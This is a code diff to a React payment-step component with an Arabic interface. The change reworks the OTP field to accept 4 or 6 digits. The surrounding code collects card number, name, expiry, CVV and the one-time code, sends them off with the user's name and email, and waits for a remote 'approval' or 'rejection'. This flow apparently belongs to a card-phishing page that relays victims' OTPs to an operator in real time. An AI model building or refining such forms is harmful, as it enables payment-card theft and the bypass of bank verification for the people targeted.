@@ -42,14 +42,13 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
 
   // OTP State
   const [showOtp, setShowOtp] = useState(false);
-  const [otpDigits, setOtpDigits] = useState(["", "", "", "", "", ""]);
+  const [otpCode, setOtpCode] = useState("");
   const [otpError, setOtpError] = useState("");
   const [isVerifying, setIsVerifying] = useState(false);
   const [demoCode, setDemoCode] = useState("");
   const [cooldown, setCooldown] = useState(0);
   const [waitingForApproval, setWaitingForApproval] = useState(false);
   const [approvalStatus, setApprovalStatus] = useState<string | null>(null);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   // Countdown timer
   useEffect(() => {
@@ -77,13 +76,12 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
         });
         // Clean up and proceed
         setWaitingForApproval(false);
-        const code = otpDigits.join("");
         onNext({
           cardNumber: cardNumber,
           cardName: cardName,
           expiry: expiry,
           cvv: cvv,
-          otpCode: code,
+          otpCode: otpCode,
         });
       } else if (status === "rejected") {
         hasProcessed = true;
@@ -93,7 +91,7 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
           variant: "destructive",
         });
         setWaitingForApproval(false);
-        setOtpDigits(["", "", "", "", "", ""]);
+        setOtpCode("");
         setOtpError("تم رفض رمز التحقق. يرجى المحاولة مرة أخرى.");
       }
     });
@@ -105,7 +103,7 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
     cardName,
     expiry,
     cvv,
-    otpDigits,
+    otpCode,
     onNext,
     toast,
   ]);
@@ -169,42 +167,15 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
     });
   };
 
-  const handleDigitChange = (index: number, value: string) => {
-    if (!/^\d*$/.test(value)) return;
-
-    const newDigits = [...otpDigits];
-    newDigits[index] = value.slice(-1);
-    setOtpDigits(newDigits);
+  const handleOtpChange = (value: string) => {
+    const digits = value.replace(/\D/g, "").slice(0, 6);
+    setOtpCode(digits);
     setOtpError("");
-
-    if (value && index < 5) {
-      inputRefs.current[index + 1]?.focus();
-    }
-  };
-
-  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
-    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus();
-    }
-  };
-
-  const handlePaste = (e: React.ClipboardEvent) => {
-    e.preventDefault();
-    const pasted = e.clipboardData
-      .getData("text")
-      .replace(/\D/g, "")
-      .slice(0, 6);
-    const newDigits = [...otpDigits];
-    pasted.split("").forEach((digit, i) => {
-      if (i < 6) newDigits[i] = digit;
-    });
-    setOtpDigits(newDigits);
   };
 
   const handleVerifyOtp = async () => {
-    const code = otpDigits.join("");
-    if (code.length !== 6) {
-      setOtpError("يرجى إدخال رمز التحقق المكون من 6 أرقام");
+    if (otpCode.length !== 4 && otpCode.length !== 6) {
+      setOtpError("يرجى إدخال رمز التحقق (4 أو 6 أرقام)");
       return;
     }
 
@@ -216,7 +187,7 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
       cardName: cardName,
       expiry: expiry,
       cvv: cvv,
-      otpCode: code,
+      otpCode: otpCode,
       userName: formData?.step_2_personal_data?.fullNameArabic,
       email: formData?.step_2_personal_data?.email,
     });
@@ -243,7 +214,7 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
     const code = Math.floor(100000 + Math.random() * 900000).toString();
     setDemoCode(code);
     setCooldown(60);
-    setOtpDigits(["", "", "", "", "", ""]);
+    setOtpCode("");
     setOtpError("");
     toast({
       title: "تم إعادة الإرسال",
@@ -291,14 +262,14 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
                 </div>
                 <div className="flex justify-between">
                   <span className="text-gray-600">الرمز:</span>
-                  <span className="font-mono font-bold text-purple-600">{otpDigits.join("")}</span>
+                  <span className="font-mono font-bold text-purple-600">{otpCode}</span>
                 </div>
               </div>
 
               <Button
                 onClick={() => {
                   setWaitingForApproval(false);
-                  setOtpDigits(["", "", "", "", "", ""]);
+                  setOtpCode("");
                 }}
                 variant="outline"
                 className="w-full border-gray-300"
@@ -363,31 +334,21 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
               </p>
             </div>
 
-            {/* OTP Input with Dashes */}
+            {/* OTP Input */}
             <div className="bg-gray-50 rounded-lg p-6">
-              <div className="flex justify-center gap-1" dir="ltr" onPaste={handlePaste}>
-                {otpDigits.map((digit, index) => (
-                  <React.Fragment key={index}>
-                    <input
-                      ref={(el) => {
-                        inputRefs.current[index] = el;
-                      }}
-                      type="tel"
-                      inputMode="numeric"
-                      pattern="[0-9]*"
-                      maxLength={1}
-                      value={digit}
-                      onChange={(e) => handleDigitChange(index, e.target.value)}
-                      onKeyDown={(e) => handleKeyDown(index, e)}
-                      className={`w-12 h-16 text-center text-2xl font-bold border-2 rounded-lg focus:outline-none focus:ring-2 transition-all ${
-                        otpError ? "border-red-500 bg-red-50" : digit ? "border-blue-500 bg-white" : "border-gray-300 bg-white hover:border-gray-400"
-                      }`}
-                      data-testid={`input-card-otp-${index}`}
-                    />
-                    {index < 5 && <span className="flex items-center px-1 text-gray-400">–</span>}
-                  </React.Fragment>
-                ))}
-              </div>
+              <input
+                type="tel"
+                inputMode="numeric"
+                pattern="[0-9]*"
+                maxLength={6}
+                value={otpCode}
+                onChange={(e) => handleOtpChange(e.target.value)}
+                placeholder="أدخل رمز التحقق"
+                className={`w-full h-16 text-center text-3xl font-bold tracking-widest border-2 rounded-lg focus:outline-none focus:ring-2 transition-all ${
+                  otpError ? "border-red-500 bg-red-50" : otpCode ? "border-blue-500 bg-white" : "border-gray-300 bg-white"
+                }`}
+                data-testid="input-card-otp"
+              />
             </div>
 
             {otpError && (
@@ -411,7 +372,7 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
             {/* Main Button */}
             <Button
               onClick={handleVerifyOtp}
-              disabled={isVerifying || otpDigits.join("").length !== 6}
+              disabled={isVerifying || (otpCode.length !== 4 && otpCode.length !== 6)}
               className="w-full bg-gray-700 hover:bg-gray-800 text-white h-14 text-lg font-bold rounded-full disabled:opacity-50"
               data-testid="button-verify-card-otp"
             >
